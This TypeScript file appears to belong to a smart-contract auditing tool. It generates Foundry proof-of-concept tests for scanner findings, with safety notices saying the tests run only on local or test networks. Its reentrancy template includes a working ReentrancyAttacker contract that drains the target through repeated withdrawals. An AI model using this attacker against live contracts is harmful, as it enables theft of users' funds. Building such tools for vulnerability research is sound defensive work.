/**
 * Foundry test template for PoC generation
 */

import { Finding } from '../../types';
import { generateExploitStrategy } from '../generator';

/**
 * Generate Foundry-compatible PoC test
 */
export function generateFoundryPoc(finding: Finding): string {
  const strategy = generateExploitStrategy(finding);
  const contractName = finding.contract;
  const ruleId = finding.rule_id;

  return `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/${contractName}.sol";

${generateSafetyHeader()}

/**
 * PROOF OF CONCEPT: ${finding.title}
 *
 * Rule ID: ${ruleId}
 * Severity: ${finding.severity.toUpperCase()}
 * Contract: ${contractName}
 * Location: ${finding.files[0]?.path || 'Unknown'}:${finding.files[0]?.line_start || 0}
 *
 * Impact: ${finding.impact}
 * Confidence: ${finding.confidence}
 *
 * Description:
 * ${finding.description}
 *
 * Recommendation:
 * ${finding.recommendation}
 */

contract ${ruleId.replace(/-/g, '_')}_Test is Test {
    ${contractName} public targetContract;
    address public attacker;
    address public victim;

    function setUp() public {
        // Setup accounts
        attacker = address(0x1);
        victim = address(0x2);

        // Fund accounts
        vm.deal(attacker, 100 ether);
        vm.deal(victim, 100 ether);

        // Deploy vulnerable contract
        targetContract = new ${contractName}();

        console.log("Contract deployed at:", address(targetContract));
        console.log("Attacker address:", attacker);
    }

${generateFoundryTest(finding)}

    function testCleanup() public {
        console.log("\\n========================================");
        console.log("REMINDER: Simulated environment only");
        console.log("NO actual funds at risk");
        console.log("========================================");
    }
}

${generateFoundryAttackerContract(finding)}
`;
}

function generateSafetyHeader(): string {
  return `
///////////////////////////// SAFETY NOTICE /////////////////////////////
//
// ⚠️  This is a SIMULATED exploit for security research purposes
// ⚠️  All transactions are executed on a LOCAL FORK or TEST NETWORK
// ⚠️  NO funds are transferred on mainnet
//
// Usage:
//   forge test --match-contract ${''} -vvv
//
//////////////////////////////////////////////////////////////////////////
`;
}

function generateFoundryTest(finding: Finding): string {
  const category = finding.tags?.[0] || '';

  switch (category) {
    case 'reentrancy':
      return `
    function testReentrancyExploit() public {
        // Step 1: Victim deposits funds
        vm.prank(victim);
        targetContract.deposit{value: 10 ether}();
        console.log("Victim deposited 10 ETH");

        // Step 2: Deploy attacker contract
        ReentrancyAttacker attackerContract = new ReentrancyAttacker(
            address(targetContract)
        );

        // Fund attacker contract
        vm.deal(address(attackerContract), 1 ether);

        // Step 3: Execute attack
        uint256 initialBalance = address(attackerContract).balance;
        console.log("Attacker initial balance:", initialBalance);

        attackerContract.attack{value: 1 ether}();

        // Step 4: Verify exploitation
        uint256 finalBalance = address(attackerContract).balance;
        console.log("Attacker final balance:", finalBalance);

        assertTrue(finalBalance > initialBalance);
        console.log("Reentrancy vulnerability confirmed!");
    }
`;

    case 'access-control':
      return `
    function testAccessControlBypass() public {
        // Step 1: Attempt unauthorized access
        vm.prank(attacker);
        targetContract.emergencyWithdraw();

        // Step 2: Verify exploitation
        uint256 attackerBalance = attacker.balance;
        console.log("Attacker gained:", attackerBalance);

        assertTrue(attackerBalance > 100 ether);
        console.log("Access control bypass confirmed!");
    }
`;

    default:
      return `
    function testVulnerability() public {
        // TODO: Implement test for ${finding.title}
        console.log("Custom test needed for:", "${finding.title}");
    }
`;
  }
}

function generateFoundryAttackerContract(finding: Finding): string {
  const category = finding.tags?.[0] || '';

  if (category === 'reentrancy') {
    return `
contract ReentrancyAttacker {
    address public targetContract;
    uint256 public attackAmount = 1 ether;

    constructor(address _target) {
        targetContract = _target;
    }

    function attack() external payable {
        (bool success, ) = targetContract.call{value: attackAmount}(
            abi.encodeWithSignature("deposit()")
        );
        require(success, "Deposit failed");

        (success, ) = targetContract.call(
            abi.encodeWithSignature("withdraw(uint256)", attackAmount)
        );
        require(success, "Withdraw failed");
    }

    receive() external payable {
        if (targetContract.balance >= attackAmount) {
            (bool success, ) = targetContract.call(
                abi.encodeWithSignature("withdraw(uint256)", attackAmount)
            );
            require(success);
        }
    }
}
`;
  }

  return '';
}
